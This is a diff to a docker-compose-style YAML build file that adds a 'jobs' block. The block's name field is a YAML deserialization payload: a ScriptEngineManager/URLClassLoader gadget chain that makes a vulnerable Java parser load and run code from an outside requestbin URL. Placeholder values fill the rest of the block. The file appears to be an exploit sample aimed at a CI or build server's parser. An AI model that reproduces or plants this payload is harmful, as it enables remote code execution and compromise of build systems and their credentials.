@@ -1,7 +1,20 @@
 version: "3.3"
 services:
-  
   service-A
     build:
       context: /
       dockerfile: /tmp/build/input/Dockerfile
+
+jobs:
+- name: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://requestbin.com/r/en70bgxpxujs/2EL6eODgyaT69uceDUSgnpzOVdO"]]]]
+  image: asdasd
+  commands:
+  - asd
+  retrieveSource: true
+  cloneCredential: !DefaultCredential {}
+  cpuRequirement: 250m
+  memoryRequirement: 128m
+  retryCondition: never
+  maxRetries: 3
+  retryDelay: 30
+  timeout: 3600
